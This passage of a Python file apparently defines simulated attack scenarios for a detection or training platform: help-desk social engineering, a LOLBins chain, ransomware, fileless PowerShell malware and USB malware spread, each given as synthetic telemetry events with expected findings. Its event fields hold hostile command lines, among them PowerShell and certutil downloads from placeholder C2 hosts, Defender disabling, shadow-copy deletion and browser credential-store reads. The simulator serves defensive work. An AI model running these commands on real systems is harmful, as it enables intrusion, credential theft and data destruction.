        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 12), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 524288, "bytes_received": 2097152, "description": "Sustained HTTPS session to M365 from foreign IP — mailbox, SharePoint access via stolen session token"}, requires_success=True),
    ],
    parameters=SESSION_HIJACKING_PARAMS,
    success_rate=0.65,
    iocs=["cdn-static-assets.com"],
    expected_findings=["Token stealer malware execution", "Browser credential store accessed — session tokens exfiltrated", "Session replay login from foreign location", "Inbox forwarding rule to external address created"],
    relevant_ioc_keys=["attacker_ip", "token_stealer_name"],
)

HELPDESK_SOCIAL_ENGINEERING = AttackScenario(
    id="helpdesk_social_engineering",
    tier="T2",
    name="Help Desk Social Engineering",
    description="Attacker sends a pretext email or chat message impersonating the victim, then contacts help desk claiming to be locked out. Social engineers IT staff into resetting MFA, enrolls attacker-controlled device, logs in from foreign IP, and accesses the victim's mailbox to harvest sensitive data.",
    attack_type="account_takeover",
    events=[
        # --- Phase 1: Pretext email/chat to trigger helpdesk call ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "Urgent: Account Access Issue — Need IT Help", "content": "Hi, I've been locked out of my account and can't access MFA. I've already contacted the help desk. Please expedite the reset.", "external": True, "metadata": {"is_malicious": True, "attack_phase": "social_engineering", "pretext_lure": True}}, requires_success=False),

        # --- Phase 2: Help desk ticket ---
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "ServiceNow", "action": "create_ticket", "resource_name": "{ticket_subject}", "success": True, "description": "Help desk ticket created for account lockout", "metadata": {"attack_phase": "social_engineering"}}, requires_success=False),

        # --- Phase 3: MFA reset by helpdesk ---
        AttackEvent(event_type="mfa_event", delay=_delay(45, 20, 10, 120), data={"action": "device_removed", "method": "admin_action", "app": "Okta Admin", "metadata": {"attack_phase": "mfa_reset", "initiated_by": "helpdesk"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(30, 15, 5, 90), "data": {"app": "ServiceNow", "action": "update_ticket", "description": "Ticket escalated - verification required", "success": True}}),

        # --- Phase 4: Attacker enrolls new MFA device ---
        AttackEvent(event_type="mfa_event", delay=_delay(10, 5, 2, 30), data={"action": "device_registered", "device_name": "{attacker_device}", "method": "push", "app": "Okta Verify", "ip": "{attacker_ip}", "metadata": {"attack_phase": "persistence", "is_attacker_device": True}}, requires_success=True),

        # --- Phase 5: Attacker login ---
        AttackEvent(event_type="login", delay=_delay(5, 3, 1, 15), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Post-login mailbox access ---
        AttackEvent(event_type="app_event", delay=_delay(4, 2, 1, 12), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_name": "Inbox", "success": True, "description": "Attacker accessed inbox after social engineering MFA reset", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Mailbox search for sensitive content ---
        AttackEvent(event_type="app_event", delay=_delay(6, 3, 1, 18), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR credentials OR SSO OR admin access'", "success": True, "description": "Attacker searched mailbox for credential-related content", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Read sensitive emails found in search ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: SSO Admin Credentials — Password Rotation Schedule", "success": True, "description": "Attacker read email containing SSO admin credential rotation details", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: VPN Access Setup — New Employee Onboarding", "success": True, "description": "Attacker read email containing VPN setup instructions", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: Browse OneDrive and download files ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "OneDrive for Business", "action": "browse_folder", "usage": "read", "resource_name": "Documents", "success": True, "description": "Attacker browsed victim's OneDrive documents", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/onedrive/Documents/IT_Systems_Access_Matrix.xlsx", "system": "onedrive", "label": "internal", "category": "infrastructure", "description": "Downloaded IT systems access matrix from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: Persistence — inbox forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Inbox forwarding rule created to external address for ongoing email monitoring", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 11: Network indicator — attacker session ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 262144, "bytes_received": 1048576, "description": "Sustained HTTPS session to M365 from foreign IP — post-helpdesk-compromise activity"}, requires_success=True),
    ],
    parameters=HELPDESK_SOCIAL_ENGINEERING_PARAMS,
    success_rate=0.35,
    iocs=[],
    expected_findings=["MFA reset performed by IT staff via social engineering", "New MFA device enrolled from suspicious IP", "Login from unknown location shortly after MFA reset", "Inbox forwarding rule to external address"],
    relevant_ioc_keys=["attacker_ip"],
)

# ---------------------------------------------------------------------------
# Malware scenario definitions
# ---------------------------------------------------------------------------

LOLBINS_ATTACK = AttackScenario(
    id="lolbins_attack",
    tier="T2",
    name="LOLBins Living-off-the-Land Attack",
    description="Attack chain using legitimate Windows binaries (LOLBins) to evade detection. Starts with Excel macro, chains through PowerShell, certutil for download, mshta for additional payload, and establishes persistence via scheduled task. Includes host enumeration and data collection/staging.",
    attack_type="malware",
    events=[
        # Phase 1: Execution — Excel macro triggers PowerShell
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "EXCEL.EXE", "action": "start", "parent_process": "explorer.exe", "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "pid": 3700, "integrity_level": "medium", "command_line": "EXCEL.EXE /e \"Q1_Budget_Review.xlsm\"", "hash": "8ec11eb608e8fb8197db2eaf793a7b969c5abf35a028728ee4e6b17604e4b8f7", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "initial_vector": "macro"}}, requires_success=False),
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"process_name": "powershell.exe", "action": "start", "parent_process": "EXCEL.EXE", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 3760, "integrity_level": "medium", "command_line": "powershell.exe -nop -w hidden -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('{c2_url}')\"", "hash": "d1da674c8621877b6d912398dd9f79c13661ec8330fec575d14834bbef59fc08", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "lolbin": True}}, requires_success=True),
        # Phase 2: Download — certutil fetches payload
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.1, 0.5), data={"process_name": "certutil.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\certutil.exe", "pid": 3820, "integrity_level": "medium", "command_line": "certutil.exe -urlcache -split -f https://{c2_domain}/payload.exe C:\\Windows\\Temp\\svchost.exe", "hash": "4abe5f31a3301bcb88064d23f0422902df6862f17be6dc894bd4fd5bd99c3b01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "download", "lolbin": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"action": "modify", "path": "C:\\Windows\\Temp\\svchost.exe", "system": "endpoint", "metadata": {"attack_phase": "download", "downloaded_payload": True}}, requires_success=True),
        # Phase 3: Additional LOLBin — mshta executes second stage
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"process_name": "mshta.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\mshta.exe", "pid": 3860, "integrity_level": "medium", "command_line": "mshta.exe \"javascript:a=new ActiveXObject('Wscript.Shell');a.Run('C:\\\\Windows\\\\Temp\\\\svchost.exe',0);close()\"", "hash": "1c6de691142d56574cf2479a7e3400a61f49db18f3e5948c17c2ff1bf6ba47e7", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "lolbin": True}}, requires_success=True),
        # Phase 4: Execution — masquerading payload
        AttackEvent(event_type="process_event", delay=_delay(0.2, 0.1, 0.05, 0.5), data={"process_name": "svchost.exe", "action": "start", "parent_process": "mshta.exe", "path": "C:\\Windows\\Temp\\svchost.exe", "pid": 3900, "integrity_level": "medium", "command_line": "C:\\Windows\\Temp\\svchost.exe", "hash": "94edd3ca74736c5d3a4455ba3e944a024be049dbd104d58b660dd7e92c9a5713", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "masquerading": True}}, requires_success=True),
        # Phase 5: Persistence — scheduled task
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\schtasks.exe", "pid": 3940, "integrity_level": "medium", "command_line": "schtasks.exe /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\svchost.exe\" /sc onlogon /ru SYSTEM", "hash": "55322500c55c55ee730ad168e1c4250c3e11f1ea5fcc9fb133d04262c01d78d0", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "lolbin": True}}, requires_success=True),
        # Phase 6: C2 beacon
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 1024, "description": "C2 beacon HTTPS connection to {c2_domain}", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
        # Phase 7: Host enumeration commands
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "whoami.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 3980, "integrity_level": "medium", "command_line": "whoami /all", "hash": "47875b9f6a3c341fc5f93b97970c23f902cdfb5181a70bc5d59b9565d2dd88d3", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "net.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 4020, "integrity_level": "medium", "command_line": "net view /domain", "hash": "6dd3f1031327d70cb96bb463416c604be5b10481bf7bceb8f48cb07bbec84334", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 8: Data collection and staging
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "read", "path": "C:\\Users\\{victim_username}\\Documents\\", "system": "local", "description": "Enumerated Documents folder for sensitive files", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "PowerShell.exe", "action": "start", "parent_process": "svchost.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\PowerShell.exe", "pid": 4080, "integrity_level": "medium", "command_line": "PowerShell.exe -c \"Compress-Archive -Path 'C:\\Users\\{victim_username}\\Documents\\*.xlsx','C:\\Users\\{victim_username}\\Documents\\*.docx' -DestinationPath 'C:\\Windows\\Temp\\update-cache.zip'\"", "hash": "b2d1baeaba49c334f527d9a641e07eb874b07e0b95f6ac9e453312f9dd0c3bad", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        # Phase 9: Recurring C2 beacons
        AttackEvent(event_type="network_event", delay=_delay(15, 5, 5, 30), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 128, "bytes_received": 512, "description": "Recurring C2 beacon to {c2_domain}", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True, "recurring": True}}, requires_success=True),
    ],
    parameters=LOLBINS_ATTACK_PARAMS,
    success_rate=0.6,
    iocs=["cdn-static-assets.com", "update-service-cdn.com"],
    expected_findings=["Excel macro spawning PowerShell", "Certutil used to download executable", "Mshta.exe used to execute payload", "Scheduled task created for persistence"],
    relevant_ioc_keys=["c2_domain", "c2_url", "attacker_ip"],
)

RANSOMWARE_DEPLOYMENT = AttackScenario(
    id="ransomware_deployment",
    tier="T2",
    name="Ransomware Deployment Attack",
    description="Multi-stage ransomware attack starting with RDP brute force. Attacker deploys Cobalt Strike beacon, performs host enumeration, dumps credentials via LSASS, disables security tools, deletes volume shadow copies, performs lateral movement to domain controller and file server, deploys ransomware binary across systems, encrypts files on network shares, and drops ransom note.",
    attack_type="malware",
    events=[
        # --- Phase 1: RDP brute force and initial access ---
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": False, "failure_reason": "invalid_password", "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "method": "RDP", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{attacker_ip}", "destination_ip": "{victim_ip}", "destination_port": 3389, "protocol": "TCP", "action": "allowed", "direction": "inbound", "auth": "ntlm", "bytes_sent": 2048, "bytes_received": 512, "description": "RDP connection established", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False, pre_attempts={"count_range": [3, 8], "delay": _delay(0.3, 0.2, 0.05, 1), "data_overrides": {"action": "blocked", "description": "RDP brute force connection attempt - blocked"}}),
        AttackEvent(event_type="login", delay=_delay(30, 15, 5, 90), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "RDP Client", "method": "RDP", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 2: Cobalt Strike beacon deployment ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "rundll32.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\rundll32.exe", "pid": 5100, "integrity_level": "high", "command_line": "rundll32.exe C:\\Windows\\Temp\\beacon.dll,Start", "hash": "eaecc8bbe9e46509e62b55f57d3582bd62c04d71cfe503fc3e19f93671ab19fc", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "is_attacker": True, "c2_framework": "Cobalt Strike"}}, requires_success=True),

        # --- Phase 3: Host enumeration ---
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "net.exe", "action": "start", "parent_process": "rundll32.exe", "path": "C:\\Windows\\System32\\net.exe", "pid": 5160, "integrity_level": "high", "command_line": "net view /domain", "hash": "f7bedd8d530891a26d7205219752a18720c01b6edba1a169bd21a933650b1e66", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Credential dumping ---
        AttackEvent(event_type="process_event", delay=_delay(10, 5, 2, 30), data={"process_name": "lsass.exe", "action": "inject", "parent_process": "rundll32.exe", "command_line": "", "integrity_level": "system", "path": "C:\\Windows\\System32\\lsass.exe", "hash": "09c24bbc3fd0e4298f77ea4782726bf6b208cb3ddc7e0dd957f2766c6ecda04e", "pid": 57460, "user_context": "NT AUTHORITY\\SYSTEM", "metadata": {"attack_phase": "credential_access", "is_attacker": True, "technique": "lsass_dump"}}, requires_success=True),

        # --- Phase 5: Disable Defender ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "powershell.exe", "action": "start", "parent_process": "rundll32.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 5220, "integrity_level": "high", "command_line": "powershell.exe -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"", "hash": "b024f62ee894543ed79915e4dd1fb52d645f41572a5b7bef49c35ce62c46f19b", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Delete volume shadow copies ---
        AttackEvent(event_type="process_event", delay=_delay(5, 3, 1, 15), data={"process_name": "vssadmin.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\System32\\vssadmin.exe", "pid": 5280, "integrity_level": "high", "command_line": "vssadmin.exe delete shadows /all /quiet", "hash": "97a5a97b8e26b670fbda1d3f3e11cd58d960bd8ce0589317b89c8f2d3b2955b6", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "impact", "is_attacker": True, "shadow_copy_deletion": True}}, requires_success=True),

        # --- Phase 7: Lateral movement to domain controller ---
        AttackEvent(event_type="app_event", delay=_delay(15, 10, 3, 45), data={"app": "Network", "action": "smb_connection", "resource_name": "\\\\DC01\\ADMIN$", "success": True, "description": "SMB lateral movement to domain controller", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.10", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 4096, "bytes_received": 8192, "description": "SMB lateral movement to domain controller", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Lateral movement to file server ---
        AttackEvent(event_type="network_event", delay=_delay(10, 5, 2, 30), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.20", "destination_port": 445, "protocol": "TCP", "action": "allowed", "direction": "internal", "auth": "kerberos", "bytes_sent": 8192, "bytes_received": 4096, "description": "SMB lateral movement to file server SRV-FILE01", "metadata": {"attack_phase": "lateral_movement", "is_attacker": True}}, requires_success=True),

        # --- Phase 9: C2 beacon ---
        AttackEvent(event_type="network_event", delay=_delay(1, 0.5, 0.2, 3), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 256, "bytes_received": 1024, "description": "C2 beacon to command and control server", "metadata": {"attack_phase": "command_and_control", "is_attacker": True, "c2_beacon": True}}, requires_success=True),

        # --- Phase 10: Ransomware deployment and encryption ---
        AttackEvent(event_type="process_event", delay=_delay(30, 20, 5, 90), data={"process_name": "locker.exe", "action": "start", "parent_process": "cmd.exe", "path": "C:\\Windows\\Temp\\locker.exe", "pid": 5400, "integrity_level": "high", "command_line": "locker.exe --encrypt-all --extension .locked", "hash": "fe93327a1e4059f13533d467b839142e8c3267f1524612664e5e3aaeb8db6ca6", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "impact", "is_attacker": True, "ransomware": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "modify", "path": "/shared/documents/", "system": "fileshare", "count_range": [8, 20], "metadata": {"attack_phase": "impact", "is_attacker": True, "mass_encryption": True}}, requires_success=True),

        # --- Phase 11: Ransom note ---
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "modify", "path": "C:\\Users\\Public\\Desktop\\README_LOCKED.txt", "system": "local", "description": "Ransom note dropped on public desktop with payment instructions", "metadata": {"attack_phase": "impact", "is_attacker": True, "ransom_note": True}}, requires_success=True),
    ],
    parameters=RANSOMWARE_PARAMS,
    success_rate=0.25,
    iocs=["api-telemetry-service.net"],
    expected_findings=["RDP brute force followed by success", "LSASS memory access for credential dumping", "SMB lateral movement to domain controller and file server", "Ransomware deployed — mass file encryption", "Ransom note dropped"],
    relevant_ioc_keys=["attacker_ip", "c2_domain"],
)

FILELESS_MALWARE_POWERSHELL = AttackScenario(
    id="fileless_malware_powershell",
    tier="T2",
    name="Fileless Malware PowerShell Attack",
    description="Fileless attack chain initiated via Teams/Slack link. JavaScript loader executes PowerShell entirely in memory, performs host enumeration, reads browser credential stores, establishes persistence via WMI subscription, and exfiltrates data via multiple DNS tunneling batches.",
    attack_type="malware",
    events=[
        # Phase 1: Delivery — user clicks malicious link in Teams
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "Microsoft Teams", "action": "open_url", "resource_name": "https://{c2_domain}/share/doc", "success": True, "description": "Clicked link shared in Teams chat", "metadata": {"attack_phase": "delivery"}}, requires_success=False),
        # Phase 2: Execution — wscript loads JavaScript which spawns PowerShell
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"process_name": "wscript.exe", "action": "start", "parent_process": "msedge.exe", "path": "C:\\Windows\\System32\\wscript.exe", "pid": 6500, "integrity_level": "medium", "command_line": "wscript.exe //e:jscript https://{c2_domain}/loader.js", "hash": "ef91f786757bcd8ec45978c0e9900bc7bbac230c6247c910425f2b49b0abfe1c", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "fileless": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(0.3, 0.1, 0.05, 0.5), data={"process_name": "powershell.exe", "action": "start", "parent_process": "wscript.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 6560, "integrity_level": "medium", "command_line": "powershell.exe -nop -w hidden -ep bypass -c \"[System.Reflection.Assembly]::Load([Convert]::FromBase64String('...')).EntryPoint.Invoke($null, @())\"", "hash": "24a74f5702318939605bc9844189f1593c8c09849c28f63918e0e52971edbf89", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "fileless": True, "in_memory": True}}, requires_success=True),
        # Phase 3: Host enumeration
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "whoami.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\whoami.exe", "pid": 6620, "integrity_level": "medium", "command_line": "whoami /all", "hash": "bcea807e76ffe791a782875fc0899e91d71dc4a579b44c0817f87cd1311900c4", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\ipconfig.exe", "pid": 6660, "integrity_level": "medium", "command_line": "ipconfig /all", "hash": "656d27b5ccf62aceed605cad10731b41ebde76e534ca630513b4d7f855cee16f", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery"}}, requires_success=True),
        # Phase 4: Credential access — reading browser credential stores
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.5, 5), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "In-memory payload read Chrome saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "chrome", "fileless": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "read", "path": "C:\\Users\\{victim_username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data", "system": "local", "label": "personal", "category": "credentials", "description": "In-memory payload read Edge saved passwords database", "metadata": {"attack_phase": "credential_access", "browser": "edge", "fileless": True}}, requires_success=True),
        # Phase 5: Persistence — WMI event subscription (fileless persistence)
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 8), data={"process_name": "powershell.exe", "action": "start", "parent_process": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": 6740, "integrity_level": "medium", "command_line": "powershell.exe -nop -c \"$wmi=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments @{Name='WinUpdFilter';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'}\"", "hash": "24a74f5702318939605bc9844189f1593c8c09849c28f63918e0e52971edbf89", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "fileless_persistence": True, "wmi_subscription": True}}, requires_success=True),
        # Phase 6: Data collection
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.5, 5), data={"action": "read", "path": "/users/documents/", "system": "endpoint", "count_range": [5, 15], "metadata": {"attack_phase": "collection", "file_type_preference": "confidential"}}, requires_success=True),
        # Phase 7: DNS exfiltration — multiple batches
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "Network", "action": "dns_query", "resource_name": "data.{c2_domain}", "success": True, "description": "DNS tunneling exfiltration batch 1 - credentials and host info", "metadata": {"attack_phase": "exfiltration", "technique": "dns_tunneling", "batch": 1}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.11", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 8192, "bytes_received": 512, "description": "High volume DNS queries to {c2_domain} batch 1 - suspected DNS tunneling", "metadata": {"attack_phase": "exfiltration", "technique": "dns_tunneling", "batch": 1}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(5, 3, 1, 15), data={"source_ip": "{victim_ip}", "destination_ip": "10.0.1.11", "destination_port": 53, "protocol": "UDP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 16384, "bytes_received": 1024, "description": "High volume DNS queries to {c2_domain} batch 2 - document exfiltration", "metadata": {"attack_phase": "exfiltration", "technique": "dns_tunneling", "batch": 2}}, requires_success=True),
        # Phase 8: C2 HTTPS session for ongoing command receipt
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 4096, "bytes_received": 2048, "description": "C2 outbound HTTPS connection to {c2_domain}", "metadata": {"attack_phase": "command_and_control"}}, requires_success=True),
    ],
    parameters=FILELESS_MALWARE_PARAMS,
    success_rate=0.55,
    iocs=["cdn-static-assets.com", "cloud-sync-service.com"],
    expected_findings=["PowerShell encoded in-memory payload (fileless)", "WMI event subscription for fileless persistence", "No malware files written to disk", "Data exfiltration via DNS tunneling"],
    relevant_ioc_keys=["c2_domain", "attacker_ip"],
)

USB_MALWARE_SPREAD = AttackScenario(
    id="usb_malware_spread",
    tier="T3",
    name="USB Malware Propagation",
    description="Malware spreads via infected USB drive inserted into an employee workstation. The autorun payload executes immediately, establishes local persistence as a Windows service, performs initial discovery (whoami, net view), then propagates via SMB to a file server and multiple workstations over subsequent days. Deploys a cryptominer on the initial host and each infected system, generating mining pool traffic from an expanding cluster of compromised hosts, eventually triggering CPU utilization alerts.",
    attack_type="malware",
    events=[
        # =====================================================================
        # DAY 1 — USB insert, autorun, persistence, discovery, first propagation
        # =====================================================================

        # --- Phase 1: USB insert ---
        AttackEvent(event_type="device_event", delay=_delay(0, 0), data={"action": "usb_connected", "device_type": "usb_storage", "vendor": "{usb_vendor}", "product": "USB Flash Drive", "serial": "USB{serial_number}", "volume_label": "BACKUP", "capacity_gb": 32, "metadata": {"attack_phase": "delivery"}}, requires_success=False),

        # --- Phase 2: Autorun execution ---
        AttackEvent(event_type="process_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"process_name": "{malware_name}", "action": "start", "parent_process": "explorer.exe", "path": "E:\\{malware_name}", "pid": 3120, "integrity_level": "medium", "command_line": "E:\\{malware_name} --install", "hash": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution", "autorun": True}}, requires_success=True),

        # --- Phase 3: Local persistence via service ---
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "sc.exe", "action": "start", "parent_process": "{malware_name}", "path": "C:\\Windows\\System32\\sc.exe", "pid": 3156, "integrity_level": "high", "command_line": "sc.exe create WindowsHelper binPath= \"C:\\Windows\\System32\\helper.exe\" start= auto", "hash": "b2c3d4e5f6a7890123456789abcdef1234567890abcdef1234567890abcdef12", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "service_creation": True}}, requires_success=True),

        # --- Phase 4: Initial discovery ---
